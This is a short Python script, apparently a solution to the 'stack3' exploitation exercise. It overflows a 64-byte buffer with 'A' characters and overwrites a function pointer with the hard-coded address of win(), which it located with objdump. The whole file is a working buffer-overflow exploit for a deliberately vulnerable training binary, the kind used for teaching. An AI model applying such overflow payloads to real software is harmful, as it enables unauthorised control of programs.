#!/usr/bin/python

# usage: ./stack3 <<< `./stack3.py`

# we need to overflow the buffer into pf
# to call win()

# we find the address of win() with objdump
#      $ objdump -t stack3 | grep win
#      08048424 g F .text  00000014              win

# padding for the buf and win address
pad = 'A'*64
winAddr = '\x24\x84\x04\x08'

print pad + winAddr